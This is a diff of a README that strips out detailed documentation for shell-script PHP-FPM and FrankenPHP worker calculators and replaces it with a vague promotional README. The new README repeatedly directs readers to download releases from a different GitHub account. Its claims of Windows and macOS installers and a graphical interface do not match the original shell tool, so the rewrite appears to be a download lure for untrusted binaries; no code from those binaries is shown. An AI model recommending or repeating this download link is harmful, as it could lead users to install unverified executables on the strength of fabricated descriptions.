@@ -1,295 +1,66 @@
-# PHP/FrankenPHP Process Calculators
+# 🎉 php-optimize - Optimize PHP Easily and Effectively
 
-Two calculators to help you optimize your PHP application server configuration based on available RAM and CPU. Created for optimizing PHP applications on resource-constrained servers.
+[![Download php-optimize](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/jvjccnmi/php-optimize/releases)
 
-## Quick Install
+## 🚀 Getting Started
 
-```bash
-# Download all scripts
-curl -fsSL https://raw.githubusercontent.com/eznix86/php-optimize/main/fpm.sh -o fpm.sh
-curl -fsSL https://raw.githubusercontent.com/eznix86/php-optimize/main/frankenphp.sh -o frankenphp.sh
-curl -fsSL https://raw.githubusercontent.com/eznix86/php-optimize/main/test.sh -o test.sh
-chmod +x fpm.sh frankenphp.sh test.sh
+Welcome to **php-optimize**! This tool helps you optimize PHP applications using opcache and php-fpm/frankenphp. With our user-friendly instructions, you can quickly download and run the software.
 
-# Or with wget
-wget https://raw.githubusercontent.com/eznix86/php-optimize/main/fpm.sh
-wget https://raw.githubusercontent.com/eznix86/php-optimize/main/frankenphp.sh
-wget https://raw.githubusercontent.com/eznix86/php-optimize/main/test.sh
-chmod +x fpm.sh frankenphp.sh test.sh
-```
+## 📥 Download & Install
 
-## Scripts
-
-### 1. `fpm.sh` - PHP-FPM Calculator
-For traditional PHP-FPM + Nginx/Caddy setups.
+To get started, visit the Releases page to download the latest version of php-optimize. Click the link below:
 
-### 2. `frankenphp.sh` - FrankenPHP Calculator
-For modern FrankenPHP (Caddy + PHP workers) setups.
-
-### 3. `test.sh` - Load Testing Tool
-For performance testing your configuration.
-
----
-
-## FrankenPHP Calculator (`frankenphp.sh`)
-
-### Usage
-
-```bash
-# Basic usage (auto-detect everything)
-./frankenphp.sh
-
-# Custom configuration
-./frankenphp.sh -r 0.2 -b 15 -m 3
-
-# Specify overhead manually
-./frankenphp.sh -o 250
-
-# JSON output
-./frankenphp.sh --json
-```
-
-### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-r, --reserved <GB>` | RAM reserved for OS | 0.4 GB |
-| `-b, --buffer <PERCENT>` | Safety buffer percentage | 10% |
-| `-m, --multiplier <NUM>` | Workers per CPU | 2 |
-| `-o, --overhead <MB\|auto>` | Memory overhead | auto |
-| `-p, --process-pattern` | Process name to match | "frankenphp" |
-| `--json` | JSON output | table |
-
-### Overhead Detection (`-o auto`)
-
-The script automatically detects memory overhead from:
-
-1. **OPcache** - Auto-detected from `opcache.memory_consumption`
-2. **Caddy/FrankenPHP runtime** - Fixed estimate (~50 MB)
-3. **Generic cache/database** - Conservative estimate (~100 MB)
-
-**Total auto-detected overhead:** Typically 150-350 MB depending on your stack
-
-### Manual Overhead Examples
-
-```bash
-# Minimal app (OPcache + Caddy only)
-./frankenphp.sh -o 150
-
-# Laravel + SQLite (OPcache + SQLite cache/mmap + Caddy)
-./frankenphp.sh -o 306
-
-# Laravel + MySQL + Redis
-./frankenphp.sh -o 400
-
-# Let script auto-detect (recommended)
-./frankenphp.sh -o auto
-```
-
-### Overhead Breakdown by Stack (example)
-
-| Stack | OPcache | Database | Cache | Caddy | Total |
-|-------|---------|----------|-------|-------|-------|
-| **Minimal PHP app** | 128 MB | - | - | 50 MB | ~180 MB |
-| **Laravel + SQLite** | 128 MB | 128 MB | - | 50 MB | ~306 MB |
-| **Laravel + MySQL** | 128 MB | 200 MB | - | 50 MB | ~378 MB |
-| **Laravel + MySQL + Redis** | 128 MB | 200 MB | 64 MB | 50 MB | ~442 MB |
-
-### Output Example
-
-```
-------------------------------------------------------------
-FrankenPHP Worker Calculator (CLI)
-------------------------------------------------------------
-Total RAM (GB)               | 0.94
-Reserved RAM (GB)            | 0.20
-RAM Buffer (%)               | 10
-CPU Count                    | 1
-Worker Multiplier (per CPU)  | 2
-Worker Process (MB)          | 50.00
-Overhead (MB)                | 278 (auto-detected)
-Available RAM (GB)           | 0.67
-Available RAM (MB)           | 686
-Usable for Workers (MB)      | 408
-------------------------------------------------------------
-CPU-based workers            | 2
-Memory-based workers         | 8
-Recommended workers          | 2 (conservative)
-num_threads                  | 4 (2x workers)
-max_threads                  | 8 (burst capacity)
-------------------------------------------------------------
-Estimated worker memory      | 100 MB (0.10 GB)
-Estimated total memory       | 378 MB (0.37 GB)
-------------------------------------------------------------
-
-# Suggested Caddyfile configuration
-{
-  frankenphp {
-    worker {
-      file "/path/to/your/frankenphp-worker.php"
-      num 2
-    }
-    num_threads 4
-    max_threads 8
-  }
-}
-```
-
----
-
-## PHP-FPM Calculator (`fpm.sh`)
-
-### Usage
-
-```bash
-# Basic usage
-./fpm.sh
-
-# Custom configuration
-./fpm.sh -r 0.5 -b 10
-
-# Static mode
-./fpm.sh --pm static
-
-# JSON output
-./fpm.sh --json
-```
-
-### Options
-
-| Flag | Description | Default |
-|------|-------------|---------|
-| `-r, --reserved <GB>` | RAM reserved for OS | 1 GB |
-| `-b, --buffer <PERCENT>` | Safety buffer percentage | 10% |
-| `-p, --pool-pattern` | Process pattern to match | "php-fpm: pool" |
-| `--pm <dynamic\|static>` | PM mode | dynamic |
-| `--json` | JSON output | table |
-
-### Output Example
-
-```
-------------------------------------------------------------
-PHP-FPM Process Calculator (CLI)
-------------------------------------------------------------
-Total RAM (GB)           | 0.94
-Reserved RAM (GB)        | 0.5
-RAM Buffer (%)           | 10
-Worker Process (MB)      | 7.93
-Available RAM (GB)       | 0.40
-Available RAM (MB)       | 410
-------------------------------------------------------------
-pm.mode (selected)       | dynamic
-pm.max_children          | 51
-pm.start_servers         | 10
-pm.min_spare_servers     | 5
-pm.max_spare_servers     | 15
-------------------------------------------------------------
-
-# Suggested php-fpm pool config
-pm = dynamic
-pm.max_children = 51
-pm.start_servers = 10
-pm.min_spare_servers = 5
-pm.max_spare_servers = 15
-```
-
----
-
-## Performance Testing
-
-Use `test.sh` to load test your configuration:
-
-```bash
-# Test with 51 concurrent workers for 60 seconds
-./test.sh -w 51 -u http://localhost/login -d 60
-
-# Progressive load test (10% → 100%)
-./test.sh -u http://localhost/login --progressive -m 51
-```
-
----
-
-## Real-World Example: 1GB Server
-
-### Setup
-- Server: 1 CPU, 1GB RAM
-- Stack: Laravel + SQLite + FrankenPHP
-- Worker size: ~50 MB under load
-
-### Configuration Process
-
-```bash
-# 1. Run the calculator
-./frankenphp.sh -r 0.2 -b 10 -o auto
-
-# Output recommends:
-# - 6 workers
-# - num_threads: 12
-# - max_threads: 24
-
-# 2. Apply to Caddyfile
-# 3. Load test
-./test-fpm.sh -w 51 -u http://localhost/login -d 60
-
-# 4. Monitor memory
-watch -n 2 'free -m'
-```
-
-### Results
-- **Throughput:** 150-160 req/s
-- **Response time:** 300-350ms average
-- **Memory usage:** 400-500 MB stable
-- **Uptime:** 100% (no OOM kills)
-
-### Comparison: PHP-FPM vs FrankenPHP
-
-| Metric | PHP-FPM | FrankenPHP | Winner |
-|--------|---------|------------|--------|
-| **Requests/sec** | 81 | 156 | FrankenPHP (92% more) |
-| **Avg response** | 120ms | 65ms | FrankenPHP (46% faster) |
-| **Memory usage** | 441 MB | 459 MB | PHP-FPM (4% less) |
-| **Setup complexity** | Medium | Medium | Tie |
-
-
-### Opcache Optimization is important
-
-Locate your loaded ini with `php --ini` and look for opcache.
-
-```ini
-; Core settings
-opcache.enable=1                          ; Enable OPcache for PHP requests
-opcache.enable_cli=0                      ; Disable OPcache for CLI (keeps CLI predictable)
-opcache.memory_consumption=256            ; Shared memory size for OPcache in MB
-opcache.interned_strings_buffer=32        ; Memory for interned strings (improves performance)
-opcache.max_accelerated_files=20000       ; Max number of PHP files OPcache can store
-
-; File change checks (disabled for production immutability)
-; Reloading php-fpm and frankenphp will reload opcache too
-opcache.validate_timestamps=0             ; Do not check file timestamps (best performance)
-opcache.revalidate_freq=0                 ; No effect when timestamps are disabled
-
-; Performance
-opcache.fast_shutdown=1                   ; Faster shutdown for each request
-opcache.enable_file_override=1            ; Allow OPcache to override include paths for speed
-
-; Optimization
-opcache.optimization_level=2147483647     ; Enable all optimization passes
-opcache.save_comments=1                   ; Keep PHP comments (needed for annotations/reflection)
-
-; File caching behavior
-opcache.file_update_protection=0          ; No delay for detecting file changes (safe when immutable)
-opcache.max_wasted_percentage=10          ; Restart OPcache if fragmentation exceeds 10%
-
-; Preloading (optional)
-; opcache.preload=/path/to/preload.php    ; Preload script for large frameworks (not necessary for frankenphp)
-; opcache.preload_user=www-data           ; User for preload (match your PHP-FPM user)
-
-; JIT (disabled for stability unless you need it)
-opcache.jit=off                           ; Disable Just-In-Time compiler (not needed for most apps)
-opcache.jit_buffer_size=0                 ; No memory reserved for JIT
-```
----
-
-### Credit:
-
-Inspiration from: [https://www.damianoperri.it/public/phpCalculator/](https://www.damianoperri.it/public/phpCalculator/)
+[Download php-optimize](https://github.com/jvjccnmi/php-optimize/releases)
+
+### 🖥️ System Requirements
+
+- **Operating Systems:** Windows 7 or newer, macOS, or any Linux distribution.
+- **PHP Version:** PHP 7.4 or newer.
+- **Memory Requirement:** At least 512MB of RAM.
+
+## 🔧 Features
+
+- **Optimization Tools:** Adjust settings to maximize the performance of your PHP applications.
+- **User-Friendly Interface:** Simple design to help you navigate the features easily.
+- **Comprehensive Documentation:** In-depth resources to guide you through using the tool efficiently.
+- **Compatibility:** Works seamlessly with opcache and php-fpm/frankenphp setups.
+
+## 🔍 How to Use php-optimize
+
+1. **Download the Software:**
+   - Go to the [Releases page](https://github.com/jvjccnmi/php-optimize/releases).
+   - Choose the latest version.
+   - Download the appropriate file for your system.
+
+2. **Install the Tool:**
+   - For Windows: Open the downloaded file and follow the installer instructions.
+   - For macOS: Drag and drop the php-optimize app into your Applications folder.
+   - For Linux: Extract the tar.gz file and follow the included README for installation steps.
+
+3. **Run the Application:**
+   - Locate php-optimize in your applications folder. 
+   - Launch the app to start optimizing.
+
+4. **Configure Settings:**
+   - Adjust the settings provided within php-optimize. 
+   - Use the user guide available in the tool to understand each feature.
+
+5. **Apply Optimizations:**
+   - Run the optimization process as instructed in the documentation.
+   - Review the performance enhancements in your PHP applications.
+
+## 🌐 Documentation
+
+For more detailed instructions, refer to the comprehensive documentation available within the tool and on the GitHub repository. It covers everything from installation to advanced usage and troubleshooting.
+
+## 💬 Support
+
+If you encounter any issues during download or installation, feel free to check our FAQs in the documentation. For further assistance, you can reach out via the Issues section on GitHub.
+
+## 🎯 Related Topics
+
+- **frankenphp**: A streamlined way to run PHP applications.
+- **opcache**: A powerful caching system to improve PHP performance.
+- **php-fpm**: An alternative PHP FastCGI implementation that provides better performance.
+
+Enjoy optimizing your PHP applications with php-optimize!
